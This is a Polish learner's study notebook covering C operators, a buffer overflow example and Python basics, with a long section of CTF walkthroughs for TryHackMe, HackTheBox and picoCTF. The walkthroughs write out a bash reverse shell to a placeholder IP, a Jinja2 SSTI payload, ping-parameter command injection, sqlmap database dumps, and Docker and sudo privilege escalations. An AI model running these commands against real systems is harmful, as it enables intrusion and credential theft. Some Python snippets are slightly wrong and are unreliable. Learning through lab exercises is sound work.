    printf("The value of a-- is %d\n", a--);
 
    // Increment (a) by (a+1) and then print
    printf("The value of ++a is %d\n", ++a);
 
    // Decrement (a+1) by (a) and then print
    printf("The value of --a is %d\n", --a);
 
    // Assignment Operators --> used to assign values to
    // variables int a =3, b=9; char d='d';
 
    // Comparison operators
    // Output of all these comparison operators will be (1)
    // if it is true and (0) if it is false
    printf(
        "\nFollowing are the comparison operators in C\n");
    printf("The value of a == b is %d\n", (a == b));
    printf("The value of a != b is %d\n", (a != b));
    printf("The value of a >= b is %d\n", (a >= b));
    printf("The value of a <= b is %d\n", (a <= b));
    printf("The value of a > b is %d\n", (a > b));
    printf("The value of a < b is %d\n", (a < b));
 
    // Logical operators
    printf("\nFollowing are the logical operators in C\n");
    printf("The value of this logical and operator ((a==b) "
           "&& (a<b)) is:%d\n",
           ((a == b) && (a < b)));
    printf("The value of this logical or operator ((a==b) "
           "|| (a<b)) is:%d\n",
           ((a == b) || (a < b)));
    printf("The value of this logical not operator "
           "(!(a==b)) is:%d\n",
           (!(a == b)));
 
    return 0;
}
```
Wyjście
Following are the Arithmetic operators in C
```
The value of a + b is 15
The value of a - b is 5
The value of a * b is 50
The value of a / b is 2
The value of a % b is 0
The value of a++ is 10
The value of a-- is 11
The value of ++a is 11
The value of --a is 10
```

Following are the comparison operators in C
```
The value of a == b is 0
The value of a != b is 1
The value of a >= b is 1
The value of a <= b is 0
The value of a > b is 1
The value of a < b is 0
```

Following are the logical operators in C
The value of this logical and operator ((a==b) && (a<b)) is:0
The value of this logical or operator ((a==b) || (a<b)) is:0
The value of this logical not operator (!(a==b)) is:1
Złożoność czasu i przestrzeni
Time Complexity: O(1)
Auxiliary Space: O(1)
Pierwszeństwo operatorów w C
W poniższej tabeli opisano kolejność pierwszeństwa i asocjatywność operatorów w języku C. Pierwszeństwo operatora zmniejsza się od góry do dołu.


![5da8df0d955cb34bd6852f7d6840a2b7.png](:/1a01cdd1f3c84fd7990867b658c70134)
![0487236d3ae215f60c48e44dfcd1a068.png](:/4fcde2ec4b9c48bfb0e3605bde975871)
![d6653c6b169b7f518b7a09a64b47eb46.png](:/b6969520fe374f029ad89bb57dd477a3)
![ad536e2e7fb15424576326df34b24a54.png](:/387a357cb99e40ada8214b5949ea2a44)

https://pl.wikibooks.org/wiki/C

• Operatory oceniające operandy dla wartości logicznych akceptują 0 jako fałsz 
lub dowolną wartość różną od zera jako prawdę
**• Te operatory to !, &&, || oraz pierwszy operand ? :**

 Operatory dające wynik logiczny zawsze dają wynik 0 (fałsz ) lub 1 (prawda)
 **Te operatory to !, &&, ||, <, >, <=, >=, ==, !=**
 
 Żadna wartość inna niż 0 lub 1 nie będzie wynikiem działania tych operatorów
 Zgodnie z zasadą „jak gdyby”, jeśli wynik tych operatorów nie jest używany jako a
wartość liczbowa, ale jest używana bezpośrednio w inny sposób (powiedzmy jako warunek 
w instrukcji if ), wówczas wynik prawda lub fałsz może skutkować rozgałęzieniem 
warunkowym, ale nie wartością 0 lub 1

kod do wydrukowania banneru:

```
#include <stdio.h>


int PrintBanner(void)
{
	
printf("\n");
	printf("       vx-underground.org Process Injection Testing Application (PITA)\n");
	printf("\n");
	printf("\t8b           d8  8b        d8  88        88    ,ad8888ba,   \n");
	printf("\t`8b         d8'   Y8,    ,8P   88        88   d8\"'    `\"8b  \n");
	printf("\t `8b       d8'     `8b  d8'    88        88  d8'            \n");
	printf("\t  `8b     d8'        Y88P      88        88  88             \n");
	printf("\t   `8b   d8'         d88b      88        88  88      88888  \n");
	printf("\t    `8b d8'        ,8P  Y8,    88        88  Y8,        88  \n");
	printf("\t     `888'        d8'    `8b   Y8a.   . a8P   Y8a.     a88  \n");
	printf("\t      `8'        8P        Y8   `\"Y8888Y\"'     `\"Y88888P\"\n");
	printf("\n");
	
	printf("   Built for process injection testing && based on the research conducted by SafeBreach Labs\n");
	printf("\n");
	printf("\n");


	return 1;
}



 int main() {
 PrintBanner();
 printf("Hello, Test\n");
 return 0;
 
}
```
funkcja main jest główną funjcją która jest wykonywana jako 1 i ostatnia. Dlatego przed Hello test musiałem wpisać "PrintBanner();" aby najpierw wydrukowało banner a potem słowo

 ```
    while (1)       // Pętla nieskończona
        sleep(1);  // Zawiesza program na 1 sekundę

    return 0; // Zwraca 0 jako kod wyjścia programu
```

Przepełnienie bufora to luka bezpieczeństwa, która może umożliwić atakującemu wykonanie nieautoryzowanego kodu na komputerze ofiary. Oto przykładowy scenariusz, w jaki sposób atakujący może wykorzystać lukę przepełnienia bufora w programie do uzyskania dostępu do urządzenia:

Atakujący znajduje lukę przepełnienia bufora w programie, który jest zainstalowany na komputerze ofiary.
Atakujący tworzy specjalnie spreparowane dane wejściowe, które wywołują przepełnienie bufora w programie i umożliwiają wykonanie nieautoryzowanego kodu.
Atakujący przekazuje spreparowane dane wejściowe do programu na komputerze ofiary, np. poprzez oszukanie ofiary, aby wprowadziła je ręcznie lub poprzez wykorzystanie innej luki bezpieczeństwa do zdalnego przesłania danych do programu.
Program na komputerze ofiary otrzymuje spreparowane dane wejściowe i ulega przepełnieniu bufora, co umożliwia atakującemu wykonanie nieautoryzowanego kodu na komputerze ofiary.
Atakujący wykorzystuje wykonany kod do uzyskania dostępu do systemu i wykonania nieautoryzowanych działań, takich jak kradzież danych, instalacja złośliwego oprogramowania lub przejęcie kontroli nad urządzeniem.
Oto przykładowy kod programu w języku C, który jest podatny na przepełnienie bufora:

```
#include <stdio.h>
#include <string.h>

int main(void) {
    char buffer[10];

    printf("Enter data: ");
    scanf("%s", buffer);

    return 0;
}
```

W powyższym kodzie program wczytuje dane od użytkownika za pomocą funkcji scanf() i przechowuje je w tablicy buffer o rozmiarze 10 bajtów. Jeśli użytkownik wprowadzi więcej niż 9 znaków (10 minus 1 dla znaku końca linii), dane zostaną zapisane poza granicami tablicy buffer, co może prowadzić do przepełnienia bufora i nadpisania ważnych danych w pamięci.

Atakujący może wykorzystać tę lukę, wprowadzając specjalnie spreparowane dane wejściowe, które wywołują przepełnienie bufora i umożliwiają wykonanie nieautoryzowanego kodu. Na przykład, atakujący może wprowadzić długie dane wejściowe zawierające kod maszynowy, który zostanie wykonany po nadpisaniu ważnych danych w pamięci.

Skutki wykorzystania luk bezpieczeństwa, takich jak przepełnienie bufora, mogą być poważne i obejmować kradzież danych, instalację złośliwego oprogramowania lub przejęcie kontroli nad urządzeniem. Dlatego ważne jest stosowanie dobrych praktyk programistycznych i regularne aktualizowanie oprogramowania w celu zapobiegania potencjalnym lukom bezpieczeństwa.

przykład bezpiecznego kodu:

```
#include <stdio.h> // Biblioteka standardowego wejścia/wyjścia
#include <string.h> // Biblioteka dla funkcji strlen() i strcmp()

int main(void)
{
    char buffer[10]; // Tablica znaków o rozmiarze 10

    printf("Enter data: "); // Wyświetla na ekranie "Enter data: "
    fgets(buffer, sizeof(buffer), stdin); // Wczytuje dane z wejścia standardowego i zapisuje je w tablicy buffer

    printf("You entered: %s\n", buffer); // Wyświetla na ekranie "You entered: " oraz zawartość tablicy buffer

    return 0; // Zwraca 0 jako kod wyjścia programu
}
```
W powyższym kodzie program wczytuje dane od użytkownika za pomocą funkcji fgets() i przechowuje je w tablicy buffer. Funkcja fgets() pozwala określić maksymalną liczbę znaków do wczytania, co zapobiega przepełnieniu bufora. W tym przypadku program wczyta maksymalnie 10 znaków (rozmiar tablicy buffer) i zapisze je w tablicy buffer.

Użycie funkcji fgets() zamiast innych funkcji wczytywania danych, takich jak scanf(), zapewnia większe bezpieczeństwo, ponieważ pozwala określić maksymalną liczbę znaków do wczytania. Dzięki temu unikniemy przepełnienia bufora, ponieważ funkcja fgets() nie wczyta więcej danych niż rozmiar tablicy buffer. W rezultacie ten kod jest bezpieczny i nie jest podatny na przepełnienie bufora.

https://www.arturpyszczuk.pl/files/c/pwc.pdf
^
|
|

 **2.2 Zmienne i stałe**
Zmienne i stałe to obiekty, które zajmują pewien obszar w pamięci komputera, do którego możemy się
odwołać podając ich nazwę lub adres (wskaźnik). Do zmiennej można wpisywać oraz zmieniać
(w trakcie działania programu) wartości zależne od jej typu. Do stałych przypisujemy wartość raz
(w kodzie źródłowym programu) i jej już zmienić nie możemy.
 
 **2.2.1 Typy zmiennych**
Każda zmienna lub stała ma swój typ, co oznacza tyle, że może przyjmować wartości z zakresu danego
typu. W poniższej tabeli przedstawione zostały typy zmiennych oraz stałych wraz z opisem jakie
wartości przyjmują. Zakresy zmiennych zostały przedstawione w punkcie 2.2.2.
![33eab1a58f52b640fa1aa92951acf643.png](:/0656150b890e4795ac09b66bb76adcf9)

**Istnieją jeszcze dodatkowe przedrostki (kwalifikatory), które można dodać przed typem zmiennej, tymi
słowami są:**
• signed – Przedrostek umożliwiający definicję liczb dodatnich oraz ujemnych (standardowo)
• unsigned – Przedrostek umożliwiający definicję liczb tylko dodatnich oraz zera.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# CTFY

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
OWASP JUICE SHOP:
Zero Stars](https://youtu.be/0YSNRz0NRt8)
* [★ Confidential Document](https://youtu.be/Yi7OiMtzGXc)
* [★ DOM XSS](https://youtu.be/BuVxyBo05F8)
* [★ Error Handling](https://youtu.be/WGafQnjSMk4)
* [★ Missing Encoding](https://youtu.be/W7Bt2AmYtao)
* [★ Outdated Allowlist](https://youtu.be/TEdZAXuTfpk)
* [★ Privacy Policy](https://youtu.be/f5tM_4vBq-w)
* [★ Repetitive Registration](https://youtu.be/mHjYOtKGYQM)
* [★★ Login Admin](https://youtu.be/LuU1fSuc7Gg)
* [★★ Admin Section](https://youtu.be/BPLhu354esc)
* [★★ Classic Stored XSS](https://youtu.be/dxzU6djocJQ)
* [★★ Deprecated Interface](https://youtu.be/yQ40B_eSj48)
* [★★ Five Star Feedback](https://youtu.be/9BsfRJA_-ik)
* [★★ Login MC SafeSearch](https://youtu.be/8VhGBdVK9ik)
* [★★ Password Strength](https://youtu.be/fnuz-3QM8ac)
* [★★ Security Policy](https://youtu.be/_h829JTNtKo)
* [★★ View Basket](https://youtu.be/hBbdxn3-aiU)
* [★★ Weird Crypto](https://youtu.be/GWJouiMUJno)
* [★★★ API-Only XSS](https://youtu.be/aGjLR4uc0ys)
* [★★★ Admin Registration](https://youtu.be/-H3Ngs-S0Ms)
* [★★★ Björn's Favorite Pet](https://youtu.be/a0k465G8Zkc)
* [★★★ Captcha Bypass](https://youtu.be/pgGVVOhIiaM)
* [★★★ Client-side XSS Protection](https://youtu.be/bNjsjs0T0_k)
* [★★★ Database Schema](https://youtu.be/0-D-e66U2Z0)
* [★★★ Forged Feedback](https://youtu.be/99iKTSkZ814)
* [★★★ Forged Review](https://youtu.be/k2abfhtuU9c)
* [★★★ GDPR Data Erasure](https://youtu.be/zBTYSpp41u8)
* [★★★ Login Amy](https://youtu.be/ICln3xcVxzI)
* [★★★ Login Bender](https://youtu.be/a6kh9fL77A0)
* [★★★ Login Jim](https://youtu.be/zJpJibswGWA)
* [★★★ Manipluate Basket](https://youtu.be/pdtDtmIiSOQ)
* [★★★ Payback Time](https://youtu.be/QN4f00VsXn4)
* [★★★ Privacy Policy Inspection](https://youtu.be/5DUXTmp5KbI)
* [★★★ Product Tampering](https://youtu.be/G4UKdotkyu8)
* [★★★ Reset Jim's Password](https://youtu.be/qYVlxeKVhgA)
* [★★★ Upload Size](https://youtu.be/5pcAPUihhWA)
* [★★★ Upload Type](https://youtu.be/4FPyMdyVt2s)
* [★★★★ Access Log (Sensitive Data Exposure)](https://youtu.be/RBTfGk-ZwnY)
* [★★★★ Ephemeral Accountant (SQL-Injection)](https://youtu.be/rD-_fRDHf9o)
* [★★★★ Expired Coupon (Improper Input Validation)](https://youtu.be/4cWTUdTvTZg)
* [★★★★ Forgotten Developer Backup (Sensitive Data Exposure)](https://youtu.be/YvkuVZ6r2Rg)
* [★★★★ Forgotten Sales Backup (Sensitive Data Exposure)](https://youtu.be/5g4WRASni6g)
* [★★★★ GDPR Data Theft (Sensitive Data Exposure)](https://youtu.be/GPW90c4Ahbc)
* [★★★★ Legacy Typosquatting (Vulnerable Components)](https://youtu.be/HqkGeWtwiHY)
* [★★★★ Login Bjoern (Broken Authentication)](https://youtu.be/pmBJ1ZAlpF8)
* [★★★★ Misplaced Signature File (Sensitive Data Exposure)](https://youtu.be/56qHiwxTjYY)
* [★★★★ Nested Easter Egg (Cryptographic Issues)](https://youtu.be/yvatrnWvcGE)
* [★★★★ NoSql Manipulation (Injection)](https://youtu.be/frymuDxKwmc)
:broken_heart:
* [★★★★★ Change Benders Password (Broken Authentication)](https://youtu.be/J3BSi-z9_7I)
* [★★★★★ Extra Language (Broken Anti Automation)](https://youtu.be/KU2LzxABetk)
* [Broken Authentication and SQL Injection - OWASP Juice Shop TryHackMe](https://youtu.be/W4MXUnZB2jc)
by
[Motasem Hamdan - CyberSecurity Trainer](https://www.youtube.com/channel/UCNSdU_1ehXtGclimTVckHmQ)
* Live Hacking von Online-Shop „Juice Shop” (:de:)
[Twitch live stream](https://www.twitch.tv/GregorBiswanger) recordings by
[Gregor Biswanger](https://www.youtube.com/channel/UCGMA9qDbIQ-EhgLD-ZrsHWw)
(🧃`v11.x`)
* [Level 1](https://youtu.be/ccy-eKYpdbk)
* [Level 2](https://youtu.be/KtMPEDJx0Sg)
* [Level 3](https://youtu.be/aqXfFVHJ91g)
* [Level 4](https://youtu.be/jfe-iEePlTc)
* [HackerOne #h1-2004 Community Day: Intro to Web Hacking - OWASP Juice Shop](https://youtu.be/KmlwIwG7Kv4)
by [Nahamsec](https://twitch.tv/nahamsec) including the creation of a
(fake) bugbounty report for all findings (🧃`v10.x`)
* [TryHackme - JuiceShop Walkthrough](https://youtu.be/3yYNvRVlKmo) by
[Profesor Parno](https://www.youtube.com/channel/UCcBThq4OKjox_kfPkG1BF0Q)
(🧃`v8.x`, 🇮🇩)
* [OWASP Juice Shop All Challenges Solved || ETHIKERS](https://youtu.be/Fjdhf6OHgRk)
full-spoiler, time-lapsed, no-commentary hacking trip (🧃`v8.x`)
* [Hacking JavaScript - Intro to Hacking Web Apps (Episode 3)](https://youtu.be/ejB1i5n_d7o)
by Arthur Kay (🧃`v8.x`)
* [HackerSploit](https://www.youtube.com/channel/UC0ZTPkdxlAKf-V33tqXwi3Q)
Youtube channel (🧃`v7.x`)
* [OWASP Juice Shop - SQL Injection](https://youtu.be/nH4r6xv-qGg)
* [Web App Penetration Testing - #15 - HTTP Attributes (Cookie Stealing)](https://youtu.be/8s3ChNKU85Q)
* [Web App Penetration Testing - #14 - Cookie Collection & Reverse Engineering](https://youtu.be/qtr0qtptYys)
* [Web App Penetration Testing - #13 - CSRF (Cross Site Request Forgery)](https://youtu.be/TwG0Rd0hr18)
* [How To Install OWASP Juice Shop](https://youtu.be/tvNKp1QXV_8)
* [7 Minute Security](https://7ms.us) Podcast (🧃`v2.x`)
* Episode #234:
[7MS #234: Pentesting OWASP Juice Shop - Part 5](https://7ms.us/7ms-234-pentesting-owasp-juice-shop-part5/)
([Youtube](https://www.youtube.com/watch?v=lGVAXCfFwv0))
* Episode #233:
[7MS #233: Pentesting OWASP Juice Shop - Part 4](https://7ms.us/7ms-233-pentesting-owasp-juice-shop-part-4/)
([Youtube](https://www.youtube.com/watch?v=1hhd9EwX7h0))
* Episode #232:
[7MS #232: Pentesting OWASP Juice Shop - Part 3](https://7ms.us/7ms-232-pentesting-owasp-juice-shop-part-3/)
([Youtube](https://www.youtube.com/watch?v=F8iRF2d-YzE))
* Episode #231:
[7MS #231: Pentesting OWASP Juice Shop - Part 2](https://7ms.us/7ms-231-pentesting-owasp-juice-shop-part-2/)
([Youtube](https://www.youtube.com/watch?v=523l4Pzhimc))
* Episode #230:
[7MS #230: Pentesting OWASP Juice Shop - Part 1](https://7ms.us/7ms-230-pentesting-owasp-juice-shop-part-1/)
([Youtube](https://www.youtube.com/watch?v=Cz37iejTsH4))
* Episode #229:
[7MS #229: Intro to Docker for Pentesters](https://7ms.us/7ms-229-intro-to-docker-for-pentesters/)
([Youtube](https://youtu

strings jakiśplik

strony do nauki / ćwiczenia:
https://ringzer0ctf.com/
https://bugcrowd.com/
https://blueteamlabs.online/
https://cyberdefenders.org/
**https://app.letsdefend.io/**

https://0xrick.github.io/misc/c2/
https://stackoverflow.com/
https://breached.to/
https://medium.com/mitre-attack
https://tryharder.jorgetesta.tech/
https://hunter.jorgetesta.tech/
**https://learn.noxtal.com/**

Jeśli umieścimy to na początku i umieścimy pojedyncze cudzysłowy wokół odwróconej powłoki z Reverse Shell, może to zadziałać.
- bash -c 'bash -i >& /dev/tcp/MY IP/9001 0>&1'

eskalacja uprawnień:
- sudo python3 -m http.server 80
- (na przejętej maszynie) wget http://MOJE IP/linpeas.sh
- (na przejętej maszynie) sudo chmod +x linpeas.sh
- (na przejętej maszynie) ./linpeas.sh
- sudo bash
- python3 -c 'import pty; pty.spawn("/bin/bash")'
teraz mam roota

https://www.vulnhub.com/resources/

NMAP skanowaniwe - sudo nmap -sV -sC -A -O -T4 10.10.10.10

## CYBORG:
**łamanie Hashu**:  john hash.txt --wordlist=rockyou.txt

**odtwarzanie kopi zapasowej za pomocą borgbackup**:
- borg list nazwa foldera z kopią zapasową
- mkdir test        #test to nazwa nowego foldera
- borg mount nazwa foldera test
- borg umount test              # rozmontowanie (usunięcie) archiwum

**eskalacja uprawnień**:
- chmod 777 /etc/mp3backups/backup.sh
- echo "/bin/bash" > /etc/mp3backups/backup.sh
- sudo /etc/mp3backups/backup.sh
- cd /root


## REVENGE
 **strona ma na przykład /products czyli http://10.10.10.10/products i po wpisaniu /1 (http://10.10.10.10/products/1') wyskakuje error to znaczy że jest prawdopodobie podatna na SQL.**

python3 sqlmap.py -u "http://10.10.10.10/products/1" --batch --dbs

**zrzucanie bazy danych** --> python3 sqlmap.py -u "http://10.10.10.10/products/1" --batch -D NAZWA tabeli --tables

**zrzucenie kolejnej zawartości** --> python3 sqlmap.py -u "http://10.10.10.10/products/1" --batch -D NAZWATABELI -T NAZWA KOLEJNEJ TABELI --dump (jeżeli chcę sprawdzić inne to te same komendy tylko muszę zmienić nazy tabel)

ODSZYFROWANIE HASHÓW -->  cd                                                                   Desktop
john --wordlist=rockyou.txt PLIKZHASHAMI

**SPRAWDZANIE UPRAWNIEŃ NA ZHAKOWANYM SERWERZE**: sudo -l

ESKALACJA UPRAWNIEŃ:
**jeżeli Użytkownik może edytować plik .service**:
```
sudoedit /etc/systemd/system/.service
```
wszystko usuwam i zostawiam tylko te komendy:![397a12abd70b704ce21cf3e883f705b0.png](:/b8a978f8f29e4f989e9dcca42913ddeb)
POTEM TRZEBA WPISAĆ TE 2 KOMENDY:
1. sudo systemctl daemon-reload
2. sudo systemctl restart .service
3. ls -lah /bin/bash
4. /bin/bash -p
5. id
6. ls -lah /root
7. zmiana nazwy zhakowanej strony --> nano /var/www/nazwastrony/templates/index.html ![41e10360e04b716ee139b1dcc208e7f0.png](:/751c19c0f689459883484c491cdae8f7)
8. cd /root

## UltraTech:

**nmap scan** - sudo nmap -Pn -sV -sC -A -O -T4 --open -p- 1-65535 10.10.238.142 (otwarte porty; 21,22,8081,31331) 

domeny działały jedynie na 10.10.238.142:31331 oraz :8081

**dirbuster**  - znalazł /js w 10.10.238.142:31331 oraz /ping w :8081
Ponieważ jest to usługa ping, zdecydowałem użyć parametru IP z adresem IP pętli zwrotnej http://10.10.238.14/ping?ip=127.0.0.1

**EKSPLOATACJA**: http://10.10.213.191:8081/ping?ip='ls -la' 
po tym zapytaniu otrzymałem baze danych - utech.db.sqlite

**następnie wpisałem**: http://10.10.213.191:8081/ping?ip=`cat%20utech.db.sqlite`
otrzymałem 2 hashe MD5 które odszyfrowałem

(r00t to nazwa użytkownika)
ŁĄCZENIE: ssh r00t@10.10.213.191 
podałem hasło
id

*ESKALACJA UPRAWNIEŃ ZA POMOCĄ DOCKERA POSIADANEGO NA ZAATAKOWANEJ MASZYNIE**

**KOMENDY** :docker run -v /:/mnt --rm -it alpine chroot /mnt sh 
docker ps -a 
docker run -v /:/mnt --rm -it bash chroot /mnt sh 
whoami 

**prywatny klucz SSH**: cat /root/.ssh/id_rsa


## BRUTE IT:
**nmap** - sudo nmap -Pn -sV -sC -A -O -T4 --open -p- 1-65535 10.10.79.22

**BRUTE FORCE ZA POMOCA BURP SUITE:** https://portswigger.net/support/using-burp-to-brute-force-a-login-page

po złamaniu hasła zdobyłem prywatny klucz RSA: **wget http://MACHINE_IP/admin/panel/id_rsa**

**DESZYFROWANIE**: /usr/share/john/ssh2john.py id_rsa > idrsa.txt
john idrsa.txt --wordlist=rockyou.txt

**ŁĄCZENIE**:  ssh john@MACHINE_IP -i id_rsa

**ESKALACJA UPRAWNIEŃ:**  sudo -l 
- Sprawdzanie w GTFObins, czy możemy wykorzystać /bin/cat, czy nie. Tak, /bin/cat można wykorzystać.
- możemy uzyskać dostęp do /etc/shadow, który zawiera użytkowników systemu i hasła.
- Utwórz plik o nazwie „hashes” i skopiuj zawartość pliku shadow w postaci skrótów i używając johna do złamania skrótów
- john hashes --wordlist=rockyou.txt
- su root
- cd root


Zawsze sprawdzaj:

Kapitalizacja
Kodowanie znaków
Końcowe spacje/nowe wiersze
Formaty daty/czasu
Formaty adresów szesnastkowych (0x0042 vs 0042 vs 00000042)


## CTF Wonderland

Pierwsza flaga: Skan nmapem, pokazał port 22 SSH, po skanie dirbusterem znalazłem katalog r/a/b/b/i/t a w kodzie źrudłowym była nazwa i hasło (alice:pass) rzecz jasna było to logowanie do ssh bo nie było żadnego innego panelu czy możliwości, połączenie przez: **ssh alice@10.10.10.10** pierwsza flaga była przez tą komendę "cat /root/user.txt" a 2 w root.txt

sudo -l <-- znalezienie że plik, ma uprawnienia  admina

eskalacja uprawnień --> https://rastating.github.io/privilege-escalation-via-python-library-hijacking/

https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7
<--

# hackthebox (python templates)

po podpowiedzi czyli dokłądną wersję pythona i serwer, po wyszukaniu znalazałem artykuł o luce Server-Side Template Injection (SSTI) https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

wykorzystany exploit (w url po / ) --> `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
i zamiast "id" mogę wpisać co chcę (po id zobaczyłem że jestem rootem) czyli wpisałem ls, znalazłem flagę .txt, i po prostu wpisałęm "cat flag.txt"

|----------------------------------------------------------|
## (zawsze używać komendy ls -la wtedy pokaże również ukryte foldery i pliki)
|----------------------------------------------------------|

## Git Happens (tryhackme)

znaleziony directory .git

użyłem narzędzia GitDumper

**najpierw komenda w Dumperze**:  `./gitdumper.sh http://10.10.52.114/.git/ Clone`  
(Clone to folder w którym są zapisane wyniki)

**Potem Extractor**: .`/extractor.sh /home/kali/Desktop/Tools/GIT/GitTools/Dumper/Clone /home/kali/Desktop/Tools/GIT/GitTools/Extractor` 
pierwsza lini to lokalizacji plików z wyniku dumpstera
a 2 to tam gdzie ma zapisać wyniki

Potem po przeszukaniu kilku folderów znalazłem hasło za pomocą tej komendy: `tail -n 20 index.html`
(równie dobrze mogłem po prostu użyć komendy cat ale z 1 jest lepszy wynik)

ctf - https://github.com/SamuraiWTF/samuraiwtf


## Simple CTF

znalezienie strony która była dostępna przez directory /simple

strona używała podatnej wersji cms
**(CVE-2019-9053)**

przeróbiłem exploita z exploit-db z zwykłej wersji pythona na python3

**uruchomiłem polecenie**: `python3 exploit.py -u http://10.10.213.147/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt`

zdobyłem nazwe użytkownika i hasło. Dzięki którym zalogowałem się przez port 2222 (ssh) 
komenda: `ssh user@10.10.10.10 -p 2222`

znalazłem flagę usera

zauważyłęm że mam uprawnienia: `/bin/bash/vim`

wyszukałem vim na stronie: https://gtfobins.github.io/gtfobins/vim/

**eskalacja uprawnień (z pomocą strony):**  komenda: `sudo vim -c ':!/bin/sh'`
cd root
i mam flagę

-------------------------------------------------------------------------------
## Pico CTF reverse enginnering
## nazwa: bbbbloat

1. cmod +x filename
2. ./filename
3. ltrace filename
4. strace filename
5. objdump -d filename
6. file filename
7. gdb filename
8. włączam ghride > window > devined strings > klikam na whats my favorite number? czyli output programu (2 razy kliknąć w fud zeby zobaczyć inną funkcję) > wchodzę znowu w decompile i zmieniam nazwę z fud cośtam na main (po to że to prawdopodobnie główna funkcja) > jako iż nie ma żadnej innej funkcjie w tym kodzie jednie jaka jest moja ulubiona liczbą i to nie jest poprawne, to w kodzie widzę coś takiego: local_48 = 0x86187 więc wpisałem 'python3' a w nim wkleiłem to: 0x86187 oraz dostałem taką odp: `549255` po włączeniu programu i wklejeniu tego kodu, dostałem flagę.


## nazwa: file-run2 / file-run1

1. chmod +x filename
2. ./filename #odpowiedź programu: Run this file with only one argument.
3. treść ctfa brzmiała tak: "Another program, but this time, it seems to want some input. What happens if you try to run it on the command line with input "Hello!"?"
4.  więc wpisałem ./run Hello! i dostałem flagę

file run1 dokłądnie to samo ale bez wpisywania Hello!, wystarczyło samo włączenie programu

## nazwa: GDB Test Drive

w opisie odrazu było rozwiązanie, jedyne co musiałem zrobić to wpisać te komendy: 
   
- [ ]  `chmod +x gdbme`
- [ ]  `gdb gdbme`
- [ ] (gdb) `layout asm`
- [ ] (gdb) `break *(main+99)`
- [ ] (gdb) `run`
- [ ] (gdb) `jump *(main+104)`

## nazwa: patchme flag

ctf zawierał zaszyfrowany plik i kod pythona ten: 

```
### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################
def str_xor(secret, key):
    #extend key to secret length
    new_key = key
    i = 0
    while len(new_key) < len(secret):
        new_key = new_key + key[i]
        i = (i + 1) % len(key)        
    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
###############################################################################


flag_enc = open('flag.txt.enc', 'rb').read()



def level_1_pw_check():
    user_pw = input("Please enter correct password for flag: ")
    if( user_pw == "ak98" + \
                   "-=90" + \
                   "adfjhgj321" + \
                   "sleuth9000"):
        print("Welcome back... your flag, user:")
        decryption = str_xor(flag_enc.decode(), "utilitarian")
        print(decryption)
        return
    print("That password is incorrect")



level_1_pw_check()
```

po przeanalizowaniu kodu można zobaczyć że kod dekoduje zaszyfrowany plik któy ma flae (funkcja decryption = str_xor(flag_enc.decode)). wystarczy tylko wpisać hasło które widać w user_pw. po dodaniu wszystkiego razem wychodzi takie hasło: "ak98-=90adfjhgj321sleuth9000" po wpisaniu hasła w progamie mam flagę.



## nazwa: findme

użyłem burpsuite do zobaczenia parametrów po zalogowaniu się na konto było  przekierowanie: ""/next-page/id=cGljb0NURntwcm94aWVzX2Fs" po zobaczeniu kodu widziałem to:         
``` setTimeout(function () {
           // after 2 seconds
           window.location = "/next-page/id=bF90aGVfd2F5XzAxZTc0OGRifQ==";
        }, 0.5)
```

czyli po 2 sekundach przekierowuje dodirecotry /home. jednak jak można zonbaczyć po znakach == na końcu jest to zakodowane przez base64. więc po dodaniu pierwszej części i 2 wychodzi cośtakiego: cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzAxZTc0OGRifQ==

odszyforwałem to tą komendą i zobaczyłem flagę:
`echo 'cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzAxZTc0OGRifQ==' | base64 -d`

## nazwa: unpackme

to był plik .upx > więc go od pakowałem tym poleceniem: upx -d filename.upx

nasępnie użyłem ghridy, i w wyszukiwarce po lewej stronie wyszukałem słowo "main"

to jest częśc kodu tego main:  

```
local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_38 = 5509350891791333953;
  local_30 = 0x30623e306b6d4146;
  local_28 = 0x5f60643630486637;
  local_20 = 0x37666132;
  local_1c = 0x4e;
  printf("What\'s my favorite number? ");
  __isoc99_scanf(&DAT_004b3020,&local_44);
  if (local_44 == 0xb83cb) {
    local_40 = (char *)rotate_encrypt(0,&local_38);
    fputs(local_40,(FILE *)stdout);
    putchar(10);
    free(local_40);
  }
  else {
    puts("Sorry, that\'s not it!");
  }
```
jak można po kodzie wywnieoskować trzeba było rozkodować"0xb83cb" odszyfrowałem to z użyciem komendy python3, wkleiłem hasło do programu i otrzymałem flagę.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# Python

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
za pomocą funkcji type() można uzyskać tym zmiennej czyli np (przykłądowy kod i output)

```
x = "Text"
y = "10"

print(type(x))
print(type(y))

wynik to: <class 'str'>
               <class 'int'>
```

Aby utworzyć zmienną globalną należy użyć  słowa "global" przykładowy kod:

```
def myfunc():
    global x
x = "Awesome"
	
myfunc()

print("Python is " + x)
```

Aby zmienić wartość globalnąwe wnątrz funkcji:

```
x = "Fantastic"

def myfunc():
    global x
	x = "Awesome"
	
myfunc()

print("Python is " + x)
```

`wynik będzie "Python is Awesome"`

## Wbudowane typy danych:
**Typ tekstu = str
typy numeryczne = int, float, complex
typy sekwencji = list, tuple, range
typy mapowania = dict
typy zestawów = set, frozenset
typy logiczne = bool
typy binarne = bytes, bytearray, memoryview
brak typu = NoneType**

W pythonie Typ danych jest ustawiany podczas przypisywania wartości do zmiennej:

np complex: 1j

![3724cd5348a5b0d1ec5fc1e209b7bc48.png](:/c189bfbc07bc45f9b6b67d561f1b348a)
![18eb6aff574086b51401b401fddb57d5.png](:/70fabb4b7ed649669542c7b0bae29e82)

Liczba zmiennoprzecinkowa może być również liczbą naukową z literą „e” oznaczającą potęgę liczby 10. np kod:

```
x = 32e3
y = 12E4
z = -87.7e100

print(x + y + z)

print(type(x))
print(type(y))
print(type(z))
```

